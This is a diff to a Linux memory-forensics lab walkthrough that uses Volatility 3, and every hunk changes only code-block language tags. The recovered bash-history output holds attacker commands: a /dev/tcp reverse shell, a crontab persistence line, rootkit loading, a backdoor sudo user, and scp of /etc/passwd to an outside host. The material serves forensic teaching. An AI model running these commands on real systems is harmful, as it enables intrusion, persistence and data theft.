@@ -164,7 +164,7 @@ Now that our lab machine is loaded, let's start examining the Linux memory image
  Verifying the Hash Let's run the following command to verify the integrity of the Linux memory dump, as shown below:
 
    Integrity Check 
-```Integrity Check 
+```bash
 ubuntu@tryhackme:~/Desktop/artifacts$ md5sum FS-01.mem      c0fbf40989bda765b8edaa------  FS-01.mem
 ```
 
@@ -175,14 +175,14 @@ ubuntu@tryhackme:~/Desktop/artifacts$ md5sum FS-01.mem      c0fbf40989bda765b8ed
  **Command:** `vol3 --help`
 
    Volatility Help 
-```Volatility Help 
+```bash
 ubuntu@tryhackme:~/Desktop/artifacts$ vol3 --helpVolatility 3 Framework 2.26.2usage: vol.py [-h] [-c CONFIG] [--parallelism [{processes,threads,off}]]              [-e EXTEND] [-p PLUGIN_DIRS] [-s SYMBOL_DIRS] [-v] [-l LOG]              [-o OUTPUT_DIR] [-q] [-r RENDERER] [-f FILE] [--write-config]              [--save-config SAVE_CONFIG] [--clear-cache]              [--cache-path CACHE_PATH] [--offline | -u URL]              [--filters FILTERS] [--hide-columns [HIDE_COLUMNS ...]]              [--single-location SINGLE_LOCATION] [--stackers [STACKERS ...]]              [--single-swap-locations [SINGLE_SWAP_LOCATIONS ...]]              PLUGIN ...---- REDACTED-----
 ```
 
    Linux Plugins We can use the grep to list down the available plugins for the Linux image, using the command `vol3 --help | grep linux` as shown below:
 
    Available Linux Plugins 
-```Available Linux Plugins 
+```bash
 ubuntu@tryhackme:~/Desktop/artifacts$ vol3 --help | grep linux
 banners.Banners : Attempts to identify potential Linux banners
 linux.bash.Bash Recovers bash command history from memory.
@@ -209,7 +209,7 @@ linux.ip.Link  Lists information about network interfaces similar to
  **Command:**  `vol3 -f FS-01.mem banners.Banners`
 
    Terminal 
-```Terminal 
+```bash
 ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem banners.BannersVolatility 3 Framework 2.26.2
 Progress:  100.00		PDB scanning finished                
 Offset	Banner
@@ -227,7 +227,7 @@ Offset	Banner
  **Command:** `vol3 -f FS-01.mem linux.pslist.PsList`
 
    Terminal 
-```Terminal 
+```bash
 ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.pslist.PsList
 Volatility 3 Framework 2.26.2
 Progress:  100.00		Stacking attempts finished           
@@ -250,7 +250,7 @@ OFFSET (V)	PID	TID	PPID	COMM	UID	GID	EUID	EGID	CREATION TIME	File output
  **Command** : `vol3 -f FS-01.mem linux.pslist.PsList > ps_output`
 
    Terminal 
-```Terminal 
+```bash
 ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.pslist.PsList > ps_output      ubuntu@tryhackme:~$ cat ps_outputVolatility 3 Framework 2.26.2
 Progress:  100.00		Stacking attempts finished           
 OFFSET (V)	PID	TID	PPID	COMM	UID	GID	EUID	EGID	CREATION TIME	File output
@@ -277,7 +277,7 @@ OFFSET (V)	PID	TID	PPID	COMM	UID	GID	EUID	EGID	CREATION TIME	File output
  **Command:** `vol3 -f FS-01.mem linux.psscan.PsScan`
 
    Terminal 
-```Terminal 
+```bash
 ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.psscan.PsScanVolatility 3 Framework 2.26.2
 Progress:  100.00		Stacking attempts finished           
 OFFSET (P)	PID	TID	PPID	COMM	EXIT_STATE
@@ -315,7 +315,7 @@ OFFSET (P)	PID	TID	PPID	COMM	EXIT_STATE
  **Command** : `vol3 -f FS-01.mem linux.psaux.PsAux`
 
    Terminal 
-```Terminal 
+```bash
 ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.psaux.PsAux                     Volatility 3 Framework 2.26.2     Progress:  100.00        Stacking attempts finished                PID    PPID    COMM        ARGS
 1      0    systemd    /sbin/init      707    1    cron        /usr/sbin/cron -f      715    1    whoopsie    /usr/bin/whoopsie -f      716    1    atd          /usr/sbin/atd -f      738    1    kerneloops    /usr/sbin/kerneloops --test     746    1    agetty       /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220      752    1    kerneloops    /usr/sbin/kerneloops     754    1    lightdm      /usr/sbin/lightdm    764    1    agetty      /sbin/agetty -o -p -- \u --noclear tty1 linux     821    1    REDACTED    /home/REDACTED     838    1    systemd      /lib/systemd/systemd --user     841    838    (sd-pam)    (sd-pam)     904    1    rtkit-daemon    /usr/libexec/rtkit-daemon17374    17344    python3    python3 -m http.server REDACTED---------------------REDACTED---------------------------------------------------
 ```
@@ -336,7 +336,7 @@ ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.psaux.PsAux       
  Command: `vol3 -f FS-01.mem linux.proc.Maps`
 
    Terminal 
-```Terminal 
+```bash
 ubuntu@tryhackme:~$ vol3 -f FS-01.mem linux.proc.Maps      Volatility 3 Framework 2.26.2     Progress:  100.00        Stacking attempts finished
 PID    Process    Start    End    Flags    PgOff    Major    Minor    Inode    File Path    File output      1    systemd    0x559fc4e4b000    0x559fc4e7d000    r--    0x0    259    1    17651    /usr/lib/systemd/systemd    Disabled      1    systemd    0x559fc4e7d000    0x559fc4f3c000    r-x    0x32000    259    1    17651    /usr/lib/systemd/systemd    Disabled      1    systemd    0x559fc4f3c000    0x559fc4f92000    r--    0xf1000    259    1    17651    /usr/lib/systemd/systemd    Disabled      1    systemd    0x559fc4f92000    0x559fc4fd8000    r--    0x146000    259    1    17651    /usr/lib/systemd/systemd    Disabled     1    systemd    0x559fc4fd8000    0x559fc4fd9000    rw-    0x18c000    259    1    17651    /usr/lib/systemd/systemd    Disabled     1    systemd    0x559fc50d1000    0x559fc53c0000    rw-    0x0    0    0    0    [heap]    Disabled      1    systemd    0x7fefc4000000    0x7fefc4021000    rw-    0x0    0    0    0    Anonymous Mapping    Disabled     1    systemd    0x7fefc4021000    0x7fefc8000000    ---    0x0    0    0    0    Anonymous Mapping    Disabled      1    systemd    0x7fefcc000000    0x7fefcc021000    rw-    0x0    0    0    0    Anonymous Mapping    Disabled      1    systemd    0x7fefcc021000    0x7fefd0000000    ---    0x0    0    0    0    Anonymous Mapping    Disabled     1    systemd    0x7fefd2d35000    0x7fefd2d36000    ---    0x0    0    0    0    Anonymous Mapping    Disabled     1    systemd    0x7fefd2d36000    0x7fefd3536000    rw-    0x0    0    0    0    Anonymous Mapping    Disabled     1    systemd    0x7fefd3536000    0x7fefd3537000    ---    0x0    0    0    0    Anonymous Mapping    Disabled      1    systemd    0x7fefd3537000    0x7fefd3d3e000    rw-    0x0    0    0    0    Anonymous Mapping    Disabled      1    systemd    0x7fefd3d3e000    0x7fefd3d4b000    r--    0x0    259    1    22584    /usr/lib/x86_64-linux-gnu/libm-2.31.so    Disabled      1    systemd    0x7fefd3d4b000    0x7fefd3df2000    r-x    0xd000    259    1    22584    /usr/lib/x86_64-linux-gnu/libm-2.31.so    Disabled     1    systemd    0x7fefd3df2000    0x7fefd3e8b000    r--    0xb4000    259    1    22584    /usr/lib/x86_64-linux-gnu/libm-2.31.so    Disabled      1    systemd    0x7fefd3e8b000    0x7fefd3e8c000    r--    0x14c000    259    1    22584    /usr/lib/x86_64-linux-gnu/libm-2.31.so    Disabled     1    systemd    0x7fefd3e8c000    0x7fefd3e8d000    rw-    0x14d000    259    1    22584    /usr/lib/x86_64-linux-gnu/libm-2.31.so    Disabled      -------------------------------[REDACTED]--------------------------------------------------------------------
 ```
@@ -405,7 +405,7 @@ Analyzing memory for suspicious network connections is crucial when investigatin
  **Command:**  `vol3 -f FS-01.mem linux.ip.Addr`
 
    IP Address Inforamtion 
-```IP Address Inforamtion 
+```bash
 ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.ip.Addr          
 Volatility 3 Framework 2.26.2
 Progress:  100.00		Stacking attempts finished           
@@ -425,7 +425,7 @@ NetNS	Index	Interface	MAC	Promiscuous	IP	Prefix	Scope Type	State
  **Command:**  `vol3 -f FS-01.mem linux.ip.Link`
 
    Network Interface Information 
-```Network Interface Information 
+```bash
 ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.ip.Link         
 Volatility 3 Framework 2.26.2
 Volatility 3 Framework 2.26.2Progress:  100.00        Stacking attempts finished           NS           Interface    MAC               State    MTU      Qdisc                Qlen        Flags026531840      lo    00:00:00:00:00:00    UNKNOWN    65536    noqueue    1000    LOOPBACK,LOWER_UP,UP4026531840    ens5    [REDACTED]    UP     9001       mq    1000    BROADCAST,LOWER_UP,MULTICAST,UP4026532265     lo    00:00:00:00:00:00    UNKNOWN    65536    noqueue    1000    LOOPBACK,LOWER_UP,UP
@@ -438,7 +438,7 @@ Volatility 3 Framework 2.26.2Progress:  100.00        Stacking attempts finished
  Commandline: `vol3 -f FS-01.mem linux.sockstat.Sockstat`
 
    Checking Socket Details 
-```Checking Socket Details 
+```bash
 ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.sockstat.Sockstat
 Volatility 3 Framework 2.26.2
 NetNS    Process Name    PID    TID    FD    Sock Offset    Family    Type    Proto    Source Addr    Source Port    Destination Addr    Destination Port    State    Filter026531840    systemd    1    1    126    0x8be20fd74440    AF_UNIX    STREAM    -    /run/systemd/journal/stdout      4738760    -    4738759    ESTABLISHED    -4026531840    systemd    1    1    127    0x8be207236a80    AF_UNIX    STREAM    -    /run/systemd/journal/stdout    4738761    -    4739223    ESTABLISHED    -4026531840    systemd    1    1    135    0x8be2038bfb80    AF_UNIX    STREAM    -    /run/avahi-daemon/socket       19420    -    -    LISTEN    -4026531840    systemd    1    1    137    0x8be204ed2200    AF_UNIX    STREAM    -    /run/lvm/lvmpolld.socket    1746    -    -    LISTEN    -4026531840    systemd    1    1    138    0x8be204edc880    AF_UNIX    STREAM    -    /run/snapd.socket    19429    -    -    LISTEN    -4026531840    systemd    1    1    139    0x8be204edd980    AF_UNIX    STREAM    -    /run/snapd-snap.socket    19431    -    -    LISTEN    -4026531840    systemd    1    1    140    0x8be2038b1540    AF_UNIX    STREAM    -    /run/acpid.socket    19807    -    -    LISTEN    -4026531840    systemd    1    1    141    0x8be2038bea80    AF_UNIX    STREAM    -    /run/dbus/system_bus_socket    19424    -    -    LISTEN    -4026531840    systemd    1    1    142    0x8be204ed2a80    AF_UNIX    STREAM    -    /run/systemd/journal/stdout    1759    -    -    LISTEN    -4026531840    systemd    1    1    144    0x8be204ed0440    AF_UNIX    DGRAM    -    /run/systemd/journal/socket    1761    -    -    UNCONNECTED    -4026531840    systemd    1    1    145    0x8be2038beec0    AF_UNIX    STREAM    -        19426    -    -    LISTEN    -4026531840    systemd    1    1    146    0x8be204ed0880    AF_UNIX    DGRAM    -    /run/systemd/journal/dev-log    1757    -    -    UNCONNECTED    -4026531840    systemd    1    1    147    0x8be203cb7000    AF_NETLINK    RAW    NETLINK_ROUTE    groups:0x800405d5    1    group:0x000000000    UNCONNECTED    -4026531840    systemd    1    1    148    0x8be203cb2800    AF_NETLINK    RAW    NETLINK_AUDIT    groups:0x00000001    1    group:0x000000000    UNCONNECTED    -4026531840    systemd    1    1    194    0x8be204ed1dc0    AF_UNIX    SEQPACKET    -    /run/udev/control    1764    -    -    UNCONNEC
@@ -503,7 +503,7 @@ When a system is compromised, attackers typically interact with it through comma
  **Command:**  `vol3 -f FS-01.mem linux.bash.Bash`
 
    Bash History 
-```Bash History 
+```bash
 ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.bash.BashVolatility 3 Framework 2.26.2PID    Process    CommandTime    Command14165    bash    2025-06-02 10:12:47.000000 UTC    useradd [REDACTED] -m -s /bin/bash14165    bash    2025-06-02 10:13:07.000000 UTC    /sbin/useradd [REDACTED] -m -s /bin/bash14165    bash    2025-06-02 10:13:10.000000 UTC    sudo su14204    bash    2025-06-02 10:13:35.000000 UTC    /sbin/useradd [REDACTED] -m -s /bin/bash14204    bash    2025-06-02 10:14:19.000000 UTC    echo '[REDACTED]secretP2ssw0rd!' | chpasswd14204    bash    2025-06-02 10:14:33.000000 UTC    usermod -aG sudo [REDACTED]14204    bash    2025-06-02 10:15:02.000000 UTC    mkdir /home/[REDACTED]/.ssh14204    bash    2025-06-02 10:15:53.000000 UTC    sudo su - [REDACTED]14204    bash    2025-06-02 10:34:33.000000 UTC    bash -i >& /dev/tcp/10.[REDACTED]/4567 0>&114204    bash    2025-06-02 10:51:34.000000 UTC    mkdir /tmp14204    bash    2025-06-02 10:51:41.000000 UTC    cd /tmp/14204    bash    2025-06-02 10:51:42.000000 UTC    ls14801    bash    2025-06-02 10:36:23.000000 UTC    sudo su14801    bash    2025-06-02 10:36:23.000000 UTC    Pf[14847    bash    2025-06-02 10:36:27.000000 UTC    echo "* * * * * root bash -i >& /dev/tcp/10.[REDACTED]/4567 0>&1" >> /etc/crontab14847    bash    2025-06-02 10:37:02.000000 UTC    isnmod rootkit.ko14847    bash    2025-06-02 10:37:11.000000 UTC    insmod rootkit.ko14847    bash    2025-06-02 10:39:46.000000 UTC    chmod +x /dev/shm/.runme.sh14847    bash    2025-06-02 10:39:51.000000 UTC    /dev/shm/.runme.sh14847    bash    2025-06-02 10:41:17.000000 UTC    scp /etc/passwd root@10.10.34.91:/home/
 ```
 
@@ -521,7 +521,7 @@ ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.bash.BashVolatilit
  **Command:**  `vol3 -f FS-01.mem linux.envars.Envars`
 
    Checking Environment variables 
-```Checking Environment variables 
+```bash
 ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.envars.EnvarsVolatility 3 Framework 2.26.2PID    PPID    COMM    KEY    VALUE1    0    systemd    HOME    /1    0    systemd    TERM    linux1    0    systemd    BOOT_IMAGE    /boot/vmlinuz-5.15.0-1066-aws170    1    systemd-journal    LANG    C.UTF-8170    1    systemd-journal    PATH    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin170    1    systemd-journal    NOTIFY_SOCKET    /run/systemd/notify
 ```
 
